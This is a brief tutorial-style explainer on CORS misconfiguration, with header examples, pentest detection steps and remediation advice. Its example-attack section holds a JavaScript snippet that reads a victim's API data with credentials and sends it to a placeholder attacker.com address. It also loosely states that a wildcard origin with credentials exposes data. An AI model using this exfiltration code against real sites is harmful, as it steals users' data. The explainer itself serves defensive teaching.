# CORS Misconfiguration

---

## 📌 Description

CORS (Cross-Origin Resource Sharing) is a browser security feature that controls how resources on a web server can be requested from another domain.

A misconfiguration occurs when a server allows unauthorized domains to access sensitive data.

---

## ⚙️ How It Works (Technical)

Browsers enforce the Same-Origin Policy (SOP), which blocks requests between different origins unless explicitly allowed.

Servers can relax this restriction using HTTP headers like:

```http
Access-Control-Allow-Origin: https://trusted.com
```

If misconfigured:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

👉 This allows any website to access sensitive data.

---

## 💣 Example Attack

### Malicious JavaScript

```javascript
fetch("https://victim.com/api/user-data", {
  credentials: "include"
})
.then(res => res.text())
.then(data => {
  fetch("https://attacker.com/steal?data=" + data);
});
```

👉 If CORS is misconfigured → attacker can read sensitive data

---

## 📍 Common Vulnerable Scenarios

* APIs exposing user data
* Admin panels
* Internal applications
* Endpoints returning JSON data

---

## 🌍 Real-World Impact

* Exposure of sensitive user data
* Account takeover
* API abuse
* Internal system access

---

## 🔎 Detection Methodology (Pentester Approach)

1. Identify API endpoints
2. Send request with custom Origin header:

   ```http
   Origin: https://evil.com
   ```
3. Check response headers:

   * Access-Control-Allow-Origin
   * Access-Control-Allow-Credentials
4. If response reflects origin → suspicious
5. Test with credentials enabled

---

## 🛡️ Remediation

* Do not use wildcard (*) with credentials
* Whitelist only trusted domains
* Avoid reflecting Origin dynamically
* Validate and restrict allowed origins

---

## 🧠 Key Takeaway

CORS misconfiguration allows attackers to bypass browser security and access sensitive data from another domain.
